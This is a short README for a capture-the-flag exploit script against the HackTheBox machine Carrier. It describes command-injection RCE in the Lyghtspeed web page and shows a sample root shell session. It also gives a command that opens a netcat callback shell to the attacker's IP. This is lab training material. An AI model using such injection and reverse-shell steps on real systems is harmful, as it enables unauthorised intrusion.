## Challenge

[Carrier](https://www.hackthebox.eu/home/machines/profile/155) from Hackthebox.eu

## Description

Provides a shell via the RCE command injection in the Lyghtspeed webpage.

## Reference

Originally published in blog posts: https://0xdf.gitlab.io/2019/03/16/htb-carrier.html#scripted-shell

## Dependencies

- python cmd
- python requests

## Usage

```
root@kali# ./carrier-rce2.py
root@r1# id
uid=0(root) gid=0(root) groups=0(root)
root@r1# pwd
/root
root@r1# ls
stuff
test_intercept.pcap
user.txt
```

Can get a nc callback shell with:
```
root@r1# shell 10.10.14.14 443
```
